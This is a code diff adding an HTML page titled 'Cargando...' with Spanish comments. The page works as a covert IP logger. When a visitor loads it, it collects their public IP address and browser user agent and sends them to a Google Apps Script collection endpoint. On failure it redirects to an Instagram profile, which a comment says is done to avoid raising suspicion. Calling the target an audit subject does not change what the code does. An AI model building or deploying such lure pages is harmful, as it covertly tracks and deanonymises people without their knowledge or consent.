@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><title>Cargando...</title></head>
+<body>
+    <script>
+        // 1. Obtener la IP real de forma externa
+        fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            const ip = data.ip;
+            const ua = navigator.userAgent;
+            const user = "Objetivo_Auditoria"; // Puede cambiar esto para cada prueba
+            
+            // 2. URL de su Google Script (la que termina en /exec)
+            const googleUrl = "https://script.google.com/macros/s/AKfycbxsWp8oJF7Ldwf1njVzgAItqCeIJ8viy_aV7k5Si5nJmwsgRfaPry-VVY8KMvPQOduL/exec";
+            
+            // 3. Construir el envío con los datos reales
+            const finalUrl = `${googleUrl}?u=${user}&ip=${ip}&ua=${ua}`;
+            
+            // Enviar y Redirigir al Instagram final
+            window.location.href = finalUrl;
+        })
+        .catch(() => {
+            // Si algo falla, redirigir igual para no levantar sospechas
+            window.location.href = "https://www.instagram.com/jon_laptrona_moza?igsh=MWRqeGUwMW94NmFzNg==";
+        });
+    </script>
+</body>
+</html>
